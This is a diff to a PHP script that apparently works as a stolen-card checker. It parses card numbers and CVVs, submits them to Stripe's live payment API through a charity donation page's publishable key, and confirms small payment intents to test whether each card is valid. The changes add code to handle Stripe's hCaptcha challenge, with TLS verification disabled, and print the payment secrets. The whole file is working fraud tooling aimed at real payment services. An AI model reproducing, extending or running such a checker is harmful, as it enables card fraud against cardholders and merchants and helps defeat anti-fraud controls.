@@ -2,7 +2,7 @@
 //https://graasp.eu/donate
 require 'function.php';
 
-error_reporting(0);
+// error_reporting(0);
 set_time_limit(0);
 // date_default_timezone_set('Asia/Jakarta');
 
@@ -79,11 +79,11 @@ $cvv = $separa[3];
 // }
 // $poxySocks4 = rebootproxys();
 
-$number1 = substr($ccn,0,4);
-$number2 = substr($ccn,4,4);
-$number3 = substr($ccn,8,4);
-$number4 = substr($ccn,12,4);
-$number6 = substr($ccn,0,6);
+$number1 = substr($cc,0,4);
+$number2 = substr($cc,4,4);
+$number3 = substr($cc,8,4);
+$number4 = substr($cc,12,4);
+$number6 = substr($cc,0,6);
 
 function value($str,$find_start,$find_end)
 {
@@ -189,7 +189,7 @@ $sessionId = getSID();
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
-curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'authority: api.stripe.com',
@@ -218,7 +218,6 @@ curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
-var_dump($result1);
 
 # -------------------- [2 REQ] -------------------#
 
@@ -255,20 +254,67 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 curl_setopt($ch, CURLOPT_POSTFIELDS,'eid=NA&payment_method='.$id.'&expected_amount=100&last_displayed_line_item_group_details[subtotal]=100&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key=pk_live_wGsASn4jgTdTrQS1EbgOz8IJ00XkkbDlBI');
 
 $result2 = curl_exec($ch);
+
+if(strpos($result2, 'intent_confirmation_challenge')) {
+
+  $verifyUrl =  substr(trim(strip_tags(getStr($result2,'"verification_url": "','},'))), 0, -1);
+  $siteKey =  substr(trim(strip_tags(getStr($result2,'"site_key": "',','))), 0, -1);
+
+  # -------------------- [Verify REQ] -------------------#
+  $ch = curl_init();
+  // curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
+  curl_setopt($ch, CURLOPT_URL, 'https://hcaptcha.com/checksiteconfig?v=d22dff0&host=b.stripecdn.com&sitekey='.$siteKey);
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+  curl_setopt($ch, CURLOPT_HEADER, 0);
+  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
+  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
+  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+  'authority: hcaptcha.com',
+  'method: POST',
+  'path: /checksiteconfig?v=d22dff0&host=b.stripecdn.com&sitekey='.$siteKey.'&sc=1&swa=1',
+  'scheme: https',
+  'accept: application/json, text/plain, */*',
+  'accept-language: en-US,en;q=0.9',
+  'content-type: application/x-www-form-urlencoded',
+  'origin: https://newassets.hcaptcha.com',
+  'referer: https://newassets.hcaptcha.com',
+  'sec-fetch-dest: empty',
+  'sec-fetch-mode: cors',
+  'sec-fetch-site: same-origin',
+  'user-agent: '.$user_agent,
+    ));
+
+  # ----------------- [Verify req Postfields] ---------------------#
+
+  curl_setopt($ch, CURLOPT_POSTFIELDS,'v=d22dff0&host=b.stripecdn.com&sitekey='.$siteKey.'&sc=1&swa=1');
+
+  $result_siteKey = curl_exec($ch);
+  $reqKey = trim(strip_tags(getStr($result_siteKey,'"req":"','"},"')));
+  die();
+  # ---------------------------------------#
+
+}
+
+
 $source = trim(strip_tags(getStr($result2,'"three_d_secure_2_source": "','"')));
 $client_secret = trim(strip_tags(getStr($result2,'"client_secret": "','"')));
 $id2 = getObj($result2,'payment_intent','id');
 
 print_r($result2);
-echo '++++++++++++++++++++++++++++++++++++++++++++++++';
+echo '<br>++++++++++++++++++++++++++++++++++++++++++++++++';
 echo '<br> client_secret => <br>';
 echo $client_secret;
-echo '++++++++++++++++++++++++++++++++++++++++++++++++';
+echo '<br>++++++++++++++++++++++++++++++++++++++++++++++++';
 echo '<br> id2 => <br>';
 echo $id2;
-echo '++++++++++++++++++++++++++++++++++++++++++++++++';
+echo '<br>++++++++++++++++++++++++++++++++++++++++++++++++';
 echo '<br> source => <br>';
-echo $source;
+print_r($source);
 
 die();
 # -------------------- [3 REQ] -------------------#
